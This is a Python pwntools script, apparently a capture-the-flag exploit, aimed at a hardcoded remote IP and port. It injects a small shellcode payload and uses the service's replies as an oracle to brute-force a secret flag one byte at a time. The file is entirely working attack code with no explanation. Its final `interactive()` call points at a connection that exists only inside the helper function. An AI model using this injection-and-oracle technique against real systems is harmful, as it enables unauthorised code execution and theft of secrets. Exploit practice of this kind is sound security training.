from pwn import *
#p=process("./pwn")

def create(index,content):
	p=remote("47.104.190.38", 10001)
	p.sendlineafter("Give me a index:\n",str(index))
	shellcode = asm("mov eax,dword ptr[ecx];ret")
	p.sendafter("Three is good number,I like it very much!\n",shellcode)
	p.sendlineafter('Leave you name of size:\n','2')
	p.sendafter("Tell me:\n",p8(content))
	tmp= p.recvuntil('\n')
	p.close()
	if '1' in tmp:
		print 'yes'
		return True
	else:
		return False

idx=0
flag=''
while "}" not in flag:
	for i in range(256):
		b=create(idx,i)
		if b:
			idx+=1
			flag+=chr(i)
			print flag
			break;
print flag
p.interactive()